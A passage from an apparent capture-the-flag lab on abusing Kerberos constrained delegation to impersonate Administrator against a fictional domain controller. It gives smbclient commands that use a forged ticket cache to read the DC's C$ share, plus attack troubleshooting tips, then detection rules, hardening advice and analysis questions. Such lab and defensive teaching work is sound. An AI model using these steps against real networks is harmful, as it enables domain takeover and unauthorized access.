The ccache contains a TGS for cifs/corp-dc01 issued in Administrator's name. Setting KRB5CCNAME points GSS-API libraries at that file. smbclient -k uses cached Kerberos credentials instead of NTLM/password auth. The DC's CIFS service receives an AP-REQ wrapping a normal-looking TGS for Administrator and serves the request as Administrator.

Kali - Mount C$ as Administrator

export KRB5CCNAME=Administrator.ccache
klist
smbclient //corp-dc01.corp.nordport.local/C$ -k -c "ls flag_${OCR_SCOPE_TOKEN}.txt; get flag_${OCR_SCOPE_TOKEN}.txt"
cat flag_${OCR_SCOPE_TOKEN}.txt
Token Effect KRB5CCNAME=<file> Tell GSS-API to use this credential cache. klist Display the principal and SPNs in the cache; verifies the right ticket is loaded. -k Authenticate using cached Kerberos credentials. corp-dc01.corp.nordport.local FQDN required; the SPN's host portion must match the connected hostname exactly.

The flag file is owned by Administrator; you read it because the SMB session authenticates as Administrator courtesy of the forged TGS.

docs.title: Step 5: Submit
docs.text:
Submit the OCR{...} value on the platform.

Common gotchas

  • Hostname vs FQDN mismatch: SMB Kerberos uses the SPN derived from the connect string. //corp-dc01/C$ produces SPN cifs/corp-dc01; //corp-dc01.corp.nordport.local/C$ produces cifs/corp-dc01.corp.nordport.local. The -spn you used in Step 3 must match the SMB connect string format.
  • KDC_ERR_BADOPTION on S4U2proxy: usually means the requested SPN is not in the source's msDS-AllowedToDelegateTo. Re-check spelling, port suffix, and trailing whitespace.
  • Clock skew: Kerberos rejects timestamps more than 5 minutes off. Sync Kali to the DC: sudo ntpdate <dc_ip> or sudo chronyc -a 'burst 4/4'.
  • Cache pollution: previous Kerberos sessions may have cached a TGS for the same SPN under a different principal. kdestroy clears the cache before setting KRB5CCNAME to the new ccache.
  • NOT_DELEGATED on the impersonated user: if Administrator has the Account is sensitive and cannot be delegated flag (UAC bit 0x100000), S4U2self fails. Pick a different impersonation target.

docs.title: Blue Team Perspective
docs.text:
The KDC events around S4U2self and S4U2proxy are distinct enough that a SOC with the right rule catches the attack within seconds.

Activity Event ID Field giveaway S4U2self request 4769 Service Name = svc_deleg, requester = self S4U2proxy issued 4769 Service Name = cifs/dc01, ticket-options include cname-in-pa-data Auth as impersonated user 4624 logon type 3 Target host event log MDI delegation alert "Suspected identity theft (pass-the-ticket)" Defender for Identity

The KDC giveaway

Two consecutive 4769 events from the same source within milliseconds, where the first has Service Name matching the source's own SAM and the second has a different SPN, is the canonical S4U signature. Defender for Identity ships a built-in detection. Custom SIEM rule: alert when 4769 ServiceName matches sourceSamAccountName followed within 5 seconds by 4769 to a different SPN from the same source.

docs.title: Hardening Note
docs.text:
The vulnerability lives in two attributes on the source account. Audit both, restrict who can set either, and never delegate to a DC service.

Constrained delegation hardening

  • LDAP audit weekly: (&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216)). Treat any DC-targeted entry as critical.
  • Empty Account Operators group; the SeEnableDelegationPrivilege granted to its members is dangerous.
  • Move delegating service accounts to gMSAs so the source credential is uncrackable.
  • Mark privileged accounts (Tier 0) as Account is sensitive and cannot be delegated (NOT_DELEGATED UAC bit 0x100000).
  • Build SIEM rule on consecutive 4769 events as described above.
  • Replace constrained delegation with RBCD for any new service deployment; RBCD is configured on the target rather than the source, which is easier to audit.

docs.title: Record Your Findings
docs.text:
Vulnerable account:

svc_deleg_<token>

Allowed-to-delegate-to:

cifs/corp-dc01.corp.nordport.local

Impersonated principal:

Administrator

Flag:

(OCR{deleg_...})

docs.title: Analysis Questions
docs.text:
1. The exercise depends on T2A4D being set in addition to msDS-AllowedToDelegateTo. What changes for the attacker if T2A4D is NOT set?

Reveal Answer

Without T2A4D, the account is configured for constrained delegation without protocol transition. S4U2self is unavailable (the bit explicitly enables it). To exercise constrained delegation in this mode, the attacker needs an actual forwardable TGT from the user they want to impersonate. That requires either: (a) capturing a forwardable TGT from somewhere, (b) waiting for the user to authenticate to a service the attacker controls, (c) coercing the user to authenticate (PetitPotam, PrinterBug). In practice, "constrained delegation without T2A4D" is much less useful as a foothold; the attack chain has to first acquire a target user's TGT through a separate mechanism. With T2A4D, no preliminaries are required: source credential alone yields impersonation.

2. The KDC enforces the msDS-AllowedToDelegateTo list when issuing the S4U2proxy TGS. What stops an attacker from editing their own account's msDS-AllowedToDelegateTo?

Reveal Answer

Editing msDS-AllowedToDelegateTo requires the SeEnableDelegationPrivilege user right, which is granted only to Domain Admins and Account Operators by default. A regular domain user cannot add SPNs to the list. However, Account Operators is a built-in group whose membership is sometimes wider than people realize, and GenericWrite on a target account does NOT grant the right to add to msDS-AllowedToDelegateTo (the schema-level enforcement uses SeEnableDelegationPrivilege, not the standard ACL). If an attacker has Domain Admin or Account Operators they have already won; the constraint exists primarily to limit how an attacker with mid-tier rights can elevate. The realistic abuse scenario is: find an account that is already configured for delegation by a sloppy admin, then leverage it; do not try to configure delegation as a non-Tier-0 attacker.

3. From a defender's perspective, what query enumerates the highest-risk constrained delegation paths?

Reveal Answer
